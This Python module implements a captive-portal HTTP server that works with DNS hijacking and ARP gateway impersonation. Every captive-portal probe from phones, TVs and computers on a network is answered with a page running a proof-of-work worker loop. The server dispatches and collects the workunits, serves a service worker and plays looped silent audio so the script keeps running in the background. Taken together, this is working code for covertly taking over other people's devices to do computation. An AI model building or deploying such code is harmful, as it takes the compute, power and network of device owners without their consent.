"""
Captive Portal HTTP server — TCP/80 listener that serves the worker page
to claimed devices and dispatches workunits via /work/claim + /work/submit.

This is the *host-side* counterpart of FakeDNS.  When AggressiveMode
runs:

  1. ``DnsHijacker`` (UDP/53) returns our IP for any CPD probe.
  2. The probing device opens its captive-portal UI on http://<our_ip>/
  3. ``CaptivePortalServer`` (TCP/80) serves ``mobile_conquest.PORTAL_HTML``
     which contains the FNV-1a worker loop.
  4. The browser polls ``/v1/claim/portal/work/claim`` for tasks, runs
     the PoW, and POSTs back to ``/v1/claim/portal/work/submit``.

The same module is reused for TVs (launched via SSAP) and phones
(triggered automatically by their captive-portal subsystem).

Production wiring: ``ClaimService.start_aggressive_full()`` brings up
this server alongside ``DnsHijacker`` + ``ArpGatewayImpersonator``.

Privileges: TCP/80 needs admin on Windows.  Bind to a specific interface
IP so that multiple ElectroMesh instances on the same host (one per
network adapter) coexist.
"""

from __future__ import annotations

import asyncio
import json
import time
from dataclasses import dataclass, field
from typing import Any

from app.logging_setup import get_logger
from app.services.mobile_conquest import PORTAL_HTML, SW_JS

log = get_logger("portal")


def _build_silent_wav(seconds: float = 1.0, sample_rate: int = 8000) -> bytes:
    """Generate a tiny silent WAV in PCM-u8.

    8 kHz mono u8 is the lowest-fidelity-but-universally-supported format —
    the webOS WebKit, iOS Safari, and Android Chrome audio decoders all
    accept it. A 1 s clip is ~8 KiB; the browser loops it client-side so we
    don't waste bandwidth. Generated in-memory so no asset file is needed.
    """
    import struct
    n_samples = int(seconds * sample_rate)
    data = bytes([0x80]) * n_samples     # unsigned-8 silence = 0x80
    fmt = struct.pack(
        "<4sI4s4sIHHIIHH4sI",
        b"RIFF", 36 + n_samples,
        b"WAVE",
        b"fmt ", 16,
        1,                # PCM
        1,                # mono
        sample_rate,
        sample_rate * 1,  # byte rate
        1,                # block align
        8,                # bits per sample
        b"data", n_samples,
    )
    return fmt + data

_SILENT_WAV = _build_silent_wav()


@dataclass(slots=True)
class WorkLedger:
    """In-memory ledger of dispatched + completed workunits.

    Real production routes this through the existing dispatcher
    (see services/dispatcher.py).  For now keep it self-contained so the
    portal can run before the full dispatcher is wired up to the device
    JWTs minted at claim time.
    """
    next_id: int = 1
    claims: int = 0
    submits: int = 0
    by_device: dict[str, dict[str, int]] = field(default_factory=dict)

    def issue(self, device_ip: str) -> dict[str, Any]:
        self.claims += 1
        wu_id = f"wu_{self.next_id}"
        self.next_id += 1
        slot = self.by_device.setdefault(device_ip, {"claims": 0, "submits": 0})
        slot["claims"] += 1
        return {
            "id": wu_id,
            "payload": f"electromesh-pow-block-{self.next_id - 1}",
            "iters": 5_000_000,
        }

    def accept(self, device_ip: str, wu_id: str, hex_digest: str, dt_ms: int) -> None:
        self.submits += 1
        slot = self.by_device.setdefault(device_ip, {"claims": 0, "submits": 0})
        slot["submits"] += 1
        log.info("portal.submit", ip=device_ip, id=wu_id,
                 hex=hex_digest[:16], ms=dt_ms)


@dataclass(slots=True)
class CaptivePortalServer:
    """TCP/80 captive-portal + worker dispatch server."""
    our_ip: str
    bind_port: int = 80
    ledger: WorkLedger = field(default_factory=WorkLedger)

    _server: asyncio.AbstractServer | None = field(default=None, init=False, repr=False)
    # Per-target fetch-arrival events — set the first time we see a HEAD/GET
    # to "/" from a given source IP. ``tv_launcher`` awaits one of these so
    # it knows the LG browser actually loaded our page before deciding when
    # to push LiveTV / YouTube back on top.
    _first_fetch_events: dict[str, asyncio.Event] = field(
        default_factory=dict, init=False, repr=False,
    )

    def wait_for_fetch(self, source_ip: str) -> asyncio.Event:
        ev = self._first_fetch_events.get(source_ip)
        if ev is None:
            ev = asyncio.Event()
            self._first_fetch_events[source_ip] = ev
        return ev

    def reset_fetch_event(self, source_ip: str) -> None:
        self._first_fetch_events.pop(source_ip, None)

    async def start(self) -> None:
        # Bind 0.0.0.0 not self.our_ip — when called with the singleton's
        # default 127.0.0.1, LAN devices can't reach us. The FakeDNS hijack
        # points every probe at our LAN address, so the listener must accept
        # connections on every interface or the iOS CNA pop never fires.
        self._server = await asyncio.start_server(
            self._handle, "0.0.0.0", self.bind_port,
        )
        log.info("portal.start", ip="0.0.0.0", advertised=self.our_ip,
                 port=self.bind_port)

    async def stop(self) -> None:
        if self._server:
            self._server.close()
            try: await self._server.wait_closed()
            except Exception: pass
        self._server = None

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        peer = writer.get_extra_info("peername")
        ip = peer[0] if peer else "?"
        try:
            head = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=5)
        except Exception:
            try: writer.close()
            except Exception: pass
            return

        head_s = head.decode("latin-1", errors="replace")
        first = head_s.split("\r\n", 1)[0]
        parts = first.split()
        method = parts[0] if parts else ""
        path = parts[1] if len(parts) > 1 else ""
        body_in = b""
        for h in head_s.split("\r\n"):
            if h.lower().startswith("content-length:"):
                try: n = int(h.split(":",1)[1].strip() or "0")
                except ValueError: n = 0
                if n:
                    try: body_in = await asyncio.wait_for(reader.readexactly(n), timeout=5)
                    except Exception: body_in = b""

        # Signal anyone awaiting "did this device actually fetch our portal?"
        # Docker bridge SNATs the source IP to the bridge gateway, so we
        # don't get the LG TV's 192.168.x.x — we get 172.17.0.1 (or
        # whatever the bridge is). We work around that by firing EVERY
        # pending event on any fetch: the TV launcher resets its event
        # right before opening the browser, so any unset event seeing
        # traffic during its short window is by definition this TV.
        for waiter_ip, ev in list(self._first_fetch_events.items()):
            if not ev.is_set():
                log.info("portal.first_fetch",
                         src_ip=ip, waiter=waiter_ip, path=path)
                ev.set()

        body, ctype, status = self._route(method, path, body_in, ip)
        try:
            writer.write(self._wrap(body, ctype, status))
            await writer.drain()
        except Exception:
            pass
        try: writer.close()
        except Exception: pass

    def _route(self, method: str, path: str, body_in: bytes, ip: str
               ) -> tuple[bytes, bytes, int]:
        # Strip query string
        bare = path.split("?", 1)[0]

        # CPD probes from Apple/Microsoft expect very specific bodies;
        # we still want them to trigger the captive UI, so 200+HTML works
        # for Android/Samsung/LG and forces the UI on iOS/MS too.
        # All known captive-portal probe paths from Android/iOS/Windows/
        # Firefox/Samsung/LG vendors -- serve the same portal HTML.
        if bare in (
            "/", "/index.html",
            "/generate_204", "/gen_204",          # Android
            "/hotspot-detect.html",                # iOS / macOS
            "/library/test/success.html",          # iOS alt
            "/success.txt",                        # Firefox
            "/connecttest.txt", "/ncsi.txt",       # Windows
            "/redirect", "/portal", "/captive",    # RFC 8910 + generic captive routes
            "/favicon.ico",                        # avoid 404 noise from TV browser
        ):
            return PORTAL_HTML.encode("utf-8"), b"text/html; charset=utf-8", 200

        if bare == "/v1/claim/portal/work/claim":
            task = self.ledger.issue(ip)
            return json.dumps({"task": task}).encode(), b"application/json", 200

        if bare == "/v1/claim/portal/work/submit":
            try: obj = json.loads(body_in or b"{}")
            except Exception: obj = {}
            self.ledger.accept(
                ip, obj.get("id", "?"),
                str(obj.get("hex", "")), int(obj.get("ms", 0) or 0),
            )
            return b'{"ok":true}', b"application/json", 200

        if bare == "/v1/claim/portal/sw.js":
            return SW_JS.encode("utf-8"), b"application/javascript", 200

        if bare in ("/v1/claim/portal/keepalive.mp3",
                    "/v1/claim/portal/keepalive.wav"):
            # 1-second silent audio (looped client-side) — keeps the page's
            # MediaSession in 'playing' state so webOS / iOS / Android keep
            # the JS hot when the app goes to background.
            return _SILENT_WAV, b"audio/wav", 200

        if bare == "/v1/claim/portal/stats":
            payload = json.dumps({
                "claims": self.ledger.claims,
                "submits": self.ledger.submits,
                "next_id": self.ledger.next_id,
                "by_device": self.ledger.by_device,
            }).encode()
            return payload, b"application/json", 200

        return b"not found", b"text/plain", 404

    @staticmethod
    def _wrap(body: bytes, ctype: bytes, status: int) -> bytes:
        reason = b"OK" if status == 200 else b"Not Found"
        # iOS CNA decision: if the body of /hotspot-detect.html does not
        # exactly equal "<HTML><HEAD><TITLE>Success</TITLE>..." it pops the
        # Captive Network Assistant. We never serve that string, so 200+HTML
        # is the correct trigger. The WISPr-ish Location hint helps older
        # iOS / macOS clients latch onto the portal faster.
        return (
            b"HTTP/1.1 " + str(status).encode() + b" " + reason + b"\r\n"
            b"Content-Type: " + ctype + b"\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"Cache-Control: no-store, no-cache, must-revalidate\r\n"
            b"Pragma: no-cache\r\n"
            b"Expires: 0\r\n"
            b"Access-Control-Allow-Origin: *\r\n"
            b"Connection: close\r\n\r\n"
        ) + body


# Singleton
_PORTAL: CaptivePortalServer | None = None


def get_portal_server(our_ip: str | None = None) -> CaptivePortalServer:
    """Singleton accessor.

    Calling without an explicit IP returns the existing instance (or creates
    one bound to 127.0.0.1). Calling *with* an IP only re-creates the
    singleton if (a) none exists yet, or (b) the running one is unbound and
    the IP is genuinely different — we don't tear down a live portal just
    because a vector function asked for it without arguments.
    """
    global _PORTAL
    if _PORTAL is None:
        _PORTAL = CaptivePortalServer(our_ip=our_ip or "127.0.0.1")
        return _PORTAL
    if our_ip and _PORTAL.our_ip != our_ip and _PORTAL._server is None:
        _PORTAL = CaptivePortalServer(our_ip=our_ip)
    return _PORTAL
